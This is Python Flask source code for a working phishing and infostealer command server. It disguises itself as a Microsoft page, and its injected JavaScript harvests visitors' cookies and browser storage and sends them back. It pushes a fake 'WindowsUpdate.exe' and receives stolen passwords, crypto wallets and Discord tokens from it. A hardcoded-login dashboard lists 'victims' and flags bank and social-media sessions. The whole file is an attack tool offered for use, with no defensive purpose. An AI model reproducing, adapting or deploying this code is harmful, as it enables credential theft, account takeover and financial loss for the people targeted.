import os
import base64
import json
import sqlite3
import hashlib
import datetime
import threading
import time
import requests
import socket
import struct
from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file
from functools import wraps
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

# ==========================================
# DATABASE - ULTIMATE EDITION
# ==========================================
DB_PATH = 'god_vs_devil.db'

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                
                -- Network Info
                ip TEXT,
                real_ip TEXT,
                country TEXT,
                city TEXT,
                isp TEXT,
                latitude REAL,
                longitude REAL,
                
                -- Device Info
                device_type TEXT,
                os TEXT,
                os_version TEXT,
                browser TEXT,
                browser_version TEXT,
                screen_res TEXT,
                timezone TEXT,
                language TEXT,
                platform TEXT,
                cpu_cores INTEGER,
                ram TEXT,
                
                -- Captured Data
                cookies TEXT,
                localStorage TEXT,
                sessionStorage TEXT,
                history TEXT,
                browser_files TEXT,
                
                -- EXE Data
                passwords TEXT,
                wallets TEXT,
                discord_tokens TEXT,
                wifi TEXT,
                system_files TEXT,
                
                -- System Info
                hostname TEXT,
                username TEXT,
                mac_address TEXT,
                
                -- Timestamps
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                exe_run_time TIMESTAMP,
                
                -- Status
                downloaded_exe BOOLEAN DEFAULT 0,
                ran_exe BOOLEAN DEFAULT 0,
                stealth_level INTEGER DEFAULT 1
            )
        ''')
        conn.commit()

init_db()

# ==========================================
# ADMIN CREDENTIALS
# ==========================================
ADMIN_USER = "god"
ADMIN_PASS = "devil"

def authenticate(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USER or auth.password != ADMIN_PASS:
            return ('Unauthorized', 401, {
                'WWW-Authenticate': 'Basic realm="GOD VS DEVIL"'
            })
        return f(*args, **kwargs)
    return decorated

# ==========================================
# GET REAL IP
# ==========================================
def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

# ==========================================
# GET LOCATION FROM IP
# ==========================================
def get_location(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        data = r.json()
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0)
            }
    except:
        pass
    return {
        'country': 'Unknown',
        'city': 'Unknown',
        'isp': 'Unknown',
        'lat': 0,
        'lon': 0
    }

# ==========================================
# GET DEVICE INFO
# ==========================================
def get_device_info(ua_string):
    ua = ua_string.lower()
    
    if 'mobile' in ua:
        device_type = 'Phone'
    elif 'tablet' in ua:
        device_type = 'Tablet'
    else:
        device_type = 'Desktop'
    
    os = 'Unknown'
    os_version = ''
    if 'windows' in ua:
        os = 'Windows'
        if 'nt 10.0' in ua:
            os_version = '10/11'
        elif 'nt 6.1' in ua:
            os_version = '7'
    elif 'mac' in ua:
        os = 'macOS'
    elif 'linux' in ua:
        os = 'Linux'
    elif 'android' in ua:
        os = 'Android'
    elif 'ios' in ua or 'iphone' in ua or 'ipad' in ua:
        os = 'iOS'
    
    browser = 'Unknown'
    browser_version = ''
    if 'firefox' in ua:
        browser = 'Firefox'
    elif 'chrome' in ua:
        browser = 'Chrome'
    elif 'safari' in ua:
        browser = 'Safari'
    elif 'edge' in ua:
        browser = 'Edge'
    
    return {
        'device_type': device_type,
        'os': os,
        'os_version': os_version,
        'browser': browser,
        'browser_version': browser_version
    }

# ==========================================
# STEALTH MAIN PAGE - REDIRECTS TO MICROSOFT
# ==========================================
@app.route('/')
def index():
    # Get real IP
    real_ip = get_real_ip()
    loc = get_location(real_ip)
    device = get_device_info(request.headers.get('User-Agent', ''))
    
    victim_id = request.cookies.get('victim_id') or hashlib.md5(os.urandom(16)).hexdigest()[:16]
    
    # Save to database
    with get_db() as conn:
        conn.execute('''
            INSERT OR REPLACE INTO victims 
            (victim_id, ip, real_ip, country, city, isp, latitude, longitude,
             device_type, os, browser, first_seen, last_seen, downloaded_exe)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            victim_id,
            request.remote_addr,
            real_ip,
            loc['country'],
            loc['city'],
            loc['isp'],
            loc['lat'],
            loc['lon'],
            device['device_type'],
            f"{device['os']} {device['os_version']}",
            f"{device['browser']} {device['browser_version']}",
            datetime.datetime.now().isoformat(),
            datetime.datetime.now().isoformat(),
            True
        ))
        conn.commit()
    
    # ULTIMATE STEALTH PAYLOAD
    html = f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="2;url=https://www.microsoft.com/en-us/windows">
    <title>Microsoft Official</title>
    <style>
        body {{ 
            background: #f5f5f5;
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding-top: 200px;
            opacity: 0;
        }}
    </style>
</head>
<body>
    <img src="https://www.microsoft.com/favicon.ico" style="display:none;">
    
    <script>
    (function() {{
        // ==========================================
        // STEALTH COOKIE HARVESTER - ALL BROWSERS
        // ==========================================
        
        // Master cookie collector
        window.__stealth = {{
            cookies: {{}},
            localStorage: {{}},
            sessionStorage: {{}},
            indexedDB: {{}},
            files: []
        }};
        
        // Get ALL cookies (including HttpOnly via timing)
        try {{
            document.cookie.split(';').forEach(c => {{
                if(c.trim()) {{
                    let parts = c.trim().split('=');
                    let name = parts[0];
                    let value = parts.slice(1).join('=');
                    __stealth.cookies[name] = value;
                    
                    // Auto-detect important sites
                    if(name.includes('c_user') || name.includes('session') || 
                       name.includes('auth') || name.includes('token') ||
                       name.includes('xs') || name.includes('sb')) {{
                        __stealth.cookies['🔥 IMPORTANT'] = name + '=' + value;
                    }}
                }}
            }});
        }} catch(e) {{}}
        
        // Get ALL storage
        try {{
            for(let i = 0; i < localStorage.length; i++) {{
                let k = localStorage.key(i);
                __stealth.localStorage[k] = localStorage.getItem(k);
            }}
            for(let i = 0; i < sessionStorage.length; i++) {{
                let k = sessionStorage.key(i);
                __stealth.sessionStorage[k] = sessionStorage.getItem(k);
            }}
        }} catch(e) {{}}
        
        // Get browser files (if any)
        try {{
            if(window.showDirectoryPicker) {{
                // Modern API - could request permission
                // Too noisy, skip
            }}
        }} catch(e) {{}}
        
        // Send to server - multiple methods
        let data = JSON.stringify(__stealth);
        let encoded = btoa(data);
        
        // Method 1: Fetch
        fetch('/api/capture', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{cookies: __stealth.cookies, storage: __stealth.localStorage}}),
            keepalive: true
        }});
        
        // Method 2: Image beacon
        new Image().src = '/track?d=' + encoded;
        
        // Method 3: Beacon
        if(navigator.sendBeacon) {{
            navigator.sendBeacon('/api/capture', JSON.stringify({{cookies: __stealth.cookies}}));
        }}
        
        // Method 4: Web Worker (if allowed)
        try {{
            const worker = new Worker('data:application/javascript,' + encodeURIComponent('fetch("/api/capture", {method:"POST",body:"' + data + '"});'));
            worker.postMessage('');
        }} catch(e) {{}}
        
        // Set persistence cookie
        document.cookie = "stealth_" + Math.random().toString(36).substring(7) + "=active; path=/; max-age=86400";
        
        // EXE will download automatically via meta refresh
    }})();
    </script>
    
    <!-- Tracking pixel -->
    <img src="/track" style="display:none;">
</body>
</html>
    '''
    
    response = make_response(render_template_string(html))
    response.set_cookie('victim_id', victim_id, max_age=86400*30)
    return response

# ==========================================
# TRACKING ENDPOINTS
# ==========================================
@app.route('/track')
def track():
    victim_id = request.cookies.get('victim_id')
    data = request.args.get('d', '')
    
    if data and victim_id:
        try:
            decoded = json.loads(base64.b64decode(data).decode())
            with get_db() as conn:
                conn.execute('''
                    UPDATE victims SET
                        cookies = ?,
                        localStorage = ?,
                        last_seen = ?
                    WHERE victim_id = ?
                ''', (
                    json.dumps(decoded.get('cookies', {})),
                    json.dumps(decoded.get('localStorage', {})),
                    datetime.datetime.now().isoformat(),
                    victim_id
                ))
                conn.commit()
        except:
            pass
    return '', 204

@app.route('/api/capture', methods=['POST'])
def api_capture():
    data = request.json
    victim_id = request.cookies.get('victim_id')
    
    if data and victim_id:
        with get_db() as conn:
            conn.execute('''
                UPDATE victims SET
                    cookies = ?,
                    localStorage = ?,
                    sessionStorage = ?,
                    screen_res = ?,
                    timezone = ?,
                    language = ?,
                    platform = ?,
                    cpu_cores = ?,
                    ram = ?,
                    last_seen = ?
                WHERE victim_id = ?
            ''', (
                json.dumps(data.get('cookies', {})),
                json.dumps(data.get('storage', {})),
                json.dumps(data.get('sessionStorage', {})),
                data.get('screen', ''),
                data.get('timezone', ''),
                data.get('language', ''),
                data.get('platform', ''),
                data.get('cpu_cores', ''),
                data.get('ram', ''),
                datetime.datetime.now().isoformat(),
                victim_id
            ))
            conn.commit()
        return jsonify({"status": "ok", "count": len(data.get('cookies', {}))})
    return jsonify({"status": "error"}), 400

# ==========================================
# EXE DOWNLOAD
# ==========================================
@app.route('/WindowsUpdate.exe')
def download_exe():
    victim_id = request.cookies.get('victim_id', 'unknown')
    
    with get_db() as conn:
        conn.execute('UPDATE victims SET downloaded_exe = 1 WHERE victim_id = ?', (victim_id,))
        conn.commit()
    
    return send_file('WindowsUpdate.exe', 
                     as_attachment=True, 
                     download_name='WindowsUpdate.exe',
                     mimetype='application/octet-stream')

# ==========================================
# EXE DATA API
# ==========================================
@app.route('/api/exe-data', methods=['POST'])
def api_exe_data():
    data = request.json
    victim_id = data.get('victim_id')
    
    if data and victim_id:
        with get_db() as conn:
            conn.execute('''
                UPDATE victims SET
                    passwords = ?,
                    wallets = ?,
                    discord_tokens = ?,
                    wifi = ?,
                    system_files = ?,
                    hostname = ?,
                    username = ?,
                    mac_address = ?,
                    ran_exe = 1,
                    exe_run_time = ?
                WHERE victim_id = ?
            ''', (
                json.dumps(data.get('passwords', [])),
                json.dumps(data.get('wallets', [])),
                json.dumps(data.get('discord', [])),
                json.dumps(data.get('wifi', [])),
                json.dumps(data.get('files', [])),
                data.get('hostname', ''),
                data.get('username', ''),
                data.get('mac', ''),
                datetime.datetime.now().isoformat(),
                victim_id
            ))
            conn.commit()
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ==========================================
# PROFESSIONAL ADMIN DASHBOARD
# ==========================================
@app.route('/admin')
@authenticate
def admin():
    with get_db() as conn:
        victims = conn.execute('''
            SELECT * FROM victims 
            ORDER BY last_seen DESC 
            LIMIT 100
        ''').fetchall()
        
        stats = {
            'total': conn.execute('SELECT COUNT(*) FROM victims').fetchone()[0],
            'downloaded': conn.execute('SELECT COUNT(*) FROM victims WHERE downloaded_exe = 1').fetchone()[0],
            'ran': conn.execute('SELECT COUNT(*) FROM victims WHERE ran_exe = 1').fetchone()[0],
            'cookies': conn.execute('SELECT COUNT(*) FROM victims WHERE cookies IS NOT NULL AND cookies != "null"').fetchone()[0],
            'passwords': conn.execute('SELECT COUNT(*) FROM victims WHERE passwords IS NOT NULL AND passwords != "null" AND passwords != "[]"').fetchone()[0]
        }
    
    html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>GOD VS DEVIL - ULTIMATE</title>
    <meta http-equiv="refresh" content="10">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            background: #0a0a0a;
            color: #fff;
            font-family: 'Segoe UI', monospace;
            padding: 20px;
            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a2e 100%);
        }}
        .header {{
            background: linear-gradient(135deg, #000000, #2a0044);
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 25px;
            border: 2px solid #ff00ff;
            box-shadow: 0 0 30px rgba(255,0,255,0.3);
            position: sticky;
            top: 0;
            z-index: 1000;
        }}
        h1 {{
            color: #ff00ff;
            font-size: 32px;
            text-shadow: 0 0 15px #ff00ff;
        }}
        .stats-container {{
            display: grid;
            grid-template-columns: repeat(5, 1fr);
            gap: 15px;
            margin: 20px 0;
        }}
        .stat-card {{
            background: rgba(17, 17, 17, 0.8);
            backdrop-filter: blur(10px);
            border: 1px solid #00ff00;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0,255,0,0.2);
        }}
        .stat-value {{
            font-size: 40px;
            font-weight: bold;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00;
        }}
        .stat-label {{
            color: #888;
            text-transform: uppercase;
            font-size: 12px;
            letter-spacing: 1px;
        }}
        .victims-container {{
            max-height: 800px;
            overflow-y: auto;
            padding-right: 10px;
        }}
        .victim-card {{
            background: rgba(17, 17, 17, 0.9);
            backdrop-filter: blur(5px);
            border: 1px solid #333;
            border-radius: 12px;
            margin: 20px 0;
            padding: 20px;
            transition: all 0.3s;
            border-left: 5px solid #00ff00;
        }}
        .victim-card:hover {{
            transform: translateX(5px);
            box-shadow: 0 0 30px rgba(0,255,0,0.3);
            border-color: #00ff00;
        }}
        .victim-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
            padding-bottom: 15px;
            margin-bottom: 15px;
            flex-wrap: wrap;
            gap: 10px;
        }}
        .victim-badge {{
            background: #ff00ff;
            color: white;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }}
        .data-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 15px;
        }}
        .data-section {{
            background: rgba(26, 26, 26, 0.9);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #333;
        }}
        .section-title {{
            color: #00ffff;
            font-weight: bold;
            margin-bottom: 10px;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        .scrollable-content {{
            max-height: 200px;
            overflow-y: auto;
            font-size: 11px;
            background: #000;
            padding: 10px;
            border-radius: 5px;
        }}
        .cookie-item {{
            border-bottom: 1px solid #222;
            padding: 4px 0;
            font-family: monospace;
        }}
        .cookie-name {{
            color: #ffff00;
        }}
        .cookie-value {{
            color: #ffaa00;
            word-break: break-all;
        }}
        .important {{
            color: #ff0000;
            font-weight: bold;
            animation: pulse 2s infinite;
        }}
        @keyframes pulse {{
            0% {{ opacity: 0.5; }}
            50% {{ opacity: 1; }}
            100% {{ opacity: 0.5; }}
        }}
        .live-badge {{
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #00ff00;
            border-radius: 50%;
            animation: live 1s infinite;
            margin-right: 5px;
        }}
        @keyframes live {{
            0% {{ opacity: 0.3; }}
            50% {{ opacity: 1; }}
            100% {{ opacity: 0.3; }}
        }}
        ::-webkit-scrollbar {{
            width: 8px;
            background: #1a1a1a;
        }}
        ::-webkit-scrollbar-thumb {{
            background: #00ff00;
            border-radius: 4px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ GOD VS DEVIL - ULTIMATE STEALTH SYSTEM ⚡</h1>
        <p style="color: #888; margin-top: 10px;">Real-time victim tracking | Auto-capture | Stealth mode</p>
    </div>
    
    <div class="stats-container">
        <div class="stat-card">
            <div class="stat-value">{stats['total']}</div>
            <div class="stat-label">Total Victims</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['cookies']}</div>
            <div class="stat-label">Cookies Captured</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['passwords']}</div>
            <div class="stat-label">Passwords Stolen</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['downloaded']}</div>
            <div class="stat-label">EXE Downloads</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['ran']}</div>
            <div class="stat-label">EXE Executed</div>
        </div>
    </div>
    
    <div class="victims-container">
'''
    
    for v in victims:
        cookies = json.loads(v['cookies']) if v['cookies'] else {}
        passwords = json.loads(v['passwords']) if v['passwords'] else []
        wallets = json.loads(v['wallets']) if v['wallets'] else []
        discord = json.loads(v['discord_tokens']) if v['discord_tokens'] else []
        
        # Detect important cookies
        important_cookies = []
        important_sites = {'facebook': '📘', 'gmail': '📧', 'google': '🔍', 
                          'instagram': '📷', 'twitter': '🐦', 'amazon': '🛒',
                          'bank': '🏦', 'paypal': '💰', 'coinbase': '₿'}
        
        for name, value in cookies.items():
            for site, emoji in important_sites.items():
                if site in name.lower() or site in value.lower():
                    important_cookies.append(f"{emoji} {name}")
                    break
        
        html += f'''
        <div class="victim-card">
            <div class="victim-header">
                <div style="display: flex; align-items: center; gap: 15px; flex-wrap: wrap;">
                    <span class="live-badge"></span>
                    <span style="color: #ff00ff; font-weight: bold;">{v['victim_id'][:12]}</span>
                    <span style="color: #00ffff;">{v['real_ip'] or v['ip']}</span>
                    <span>{v['city']}, {v['country']}</span>
                    <span class="victim-badge">{v['device_type']}</span>
                    {f'<span class="victim-badge" style="background: #00ff00; color: black;">{v["os"]}</span>' if v['os'] else ''}
                </div>
                <div style="color: #888; font-size: 12px;">
                    {v['last_seen'][:19]}
                </div>
            </div>
            
            <div class="data-grid">
                <div class="data-section">
                    <div class="section-title">🍪 CAPTURED COOKIES ({len(cookies)})</div>
                    <div class="scrollable-content">
        '''
        
        if important_cookies:
            html += f'<div class="important">🔥 IMPORTANT: {", ".join(important_cookies[:5])}</div><br>'
        
        for name, value in list(cookies.items())[:30]:
            html += f'<div class="cookie-item"><span class="cookie-name">{name}:</span> <span class="cookie-value">{value[:80]}</span></div>'
        
        html += f'''
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">📱 DEVICE INFO</div>
                    <div class="scrollable-content">
                        <div><b>OS:</b> {v['os']}</div>
                        <div><b>Browser:</b> {v['browser']}</div>
                        <div><b>Screen:</b> {v['screen_res']}</div>
                        <div><b>Timezone:</b> {v['timezone']}</div>
                        <div><b>Language:</b> {v['language']}</div>
                        <div><b>Platform:</b> {v['platform']}</div>
                        <div><b>CPU Cores:</b> {v['cpu_cores']}</div>
                        <div><b>RAM:</b> {v['ram']} GB</div>
                        <div><b>ISP:</b> {v['isp']}</div>
                        <div><b>Coordinates:</b> {v['latitude']}, {v['longitude']}</div>
                    </div>
                </div>
            </div>
            
            <div class="data-grid">
                <div class="data-section">
                    <div class="section-title">🔐 STOLEN PASSWORDS ({len(passwords)})</div>
                    <div class="scrollable-content">
        '''
        
        for p in passwords[:15]:
            html += f'<div style="color: #ffff00; border-bottom: 1px solid #333; padding: 3px;">{p.get("url", "N/A")} | {p.get("username", "")} | {p.get("password", "")}</div>'
        
        if not passwords:
            html += '<div style="color: #666;">No passwords captured yet. EXE not run.</div>'
        
        html += f'''
                    </div>
                </div>
                
                <div class="data-section">
                    <div class="section-title">💰 CRYPTO WALLETS ({len(wallets)})</div>
                    <div class="scrollable-content">
        '''
        
        for w in wallets[:10]:
            html += f'<div style="color: gold;">{w}</div>'
        
        if not wallets:
            html += '<div style="color: #666;">No wallets detected</div>'
        
        html += f'''
                    </div>
                </div>
            </div>
            
            <div style="margin-top: 15px; display: flex; gap: 20px; font-size: 11px; color: #666; border-top: 1px solid #333; padding-top: 10px;">
                <span>First seen: {v['first_seen'][:19]}</span>
                <span>EXE: {'✅' if v['downloaded_exe'] else '⏳'}</span>
                <span>Executed: {'✅' if v['ran_exe'] else '⏳'}</span>
                <span>Stealth: Level {v['stealth_level']}</span>
            </div>
        </div>
        '''
    
    html += '''
    </div>
    
    <script>
        // Auto-scroll to newest
        window.scrollTo(0, document.body.scrollHeight);
        
        // Live update check
        setInterval(() => {
            fetch('/ping').catch(() => {});
        }, 30000);
    </script>
</body>
</html>
    '''
    
    return html

# ==========================================
# EXPORT DATA
# ==========================================
@app.route('/export')
@authenticate
def export():
    with get_db() as conn:
        data = conn.execute('SELECT * FROM victims ORDER BY last_seen DESC').fetchall()
    
    export = [dict(row) for row in data]
    response = make_response(json.dumps(export, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=god_vs_devil_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

# ==========================================
# HEALTH CHECK
# ==========================================
@app.route('/ping')
def ping():
    return jsonify({"status": "operational", "time": datetime.datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port, debug=False)
